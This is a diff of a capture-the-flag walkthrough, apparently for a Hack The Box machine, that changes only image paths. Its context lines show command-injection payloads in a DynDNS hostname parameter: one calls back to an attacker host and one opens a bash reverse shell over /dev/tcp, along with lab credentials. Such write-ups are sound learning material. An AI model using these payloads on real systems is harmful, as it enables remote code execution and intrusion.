@@ -106,7 +106,7 @@ badauth
 
 Weird. Googling "badauth DNS" shows us ths is an error caused by a DNS software called DynDns:
 
-<figure><img src="../../../.gitbook/assets/image (20) (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (20) (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 Googling `/nic/update` reveals that this is actually an API that we can access:
 
@@ -142,7 +142,7 @@ $ curl -G --data-urlencode 'hostname=$(curl 168431117/rce).no-ip.htb' http://dyn
 $ curl -G --data-urlencode 'hostname=$(bash -c "bash -i >& /dev/tcp/168431117/4444 0>&1").no-ip.htb' http://dynadns:sndanyd@dyna.htb/nic/updat
 ```
 
-<figure><img src="../../../.gitbook/assets/image (21) (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (21) (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
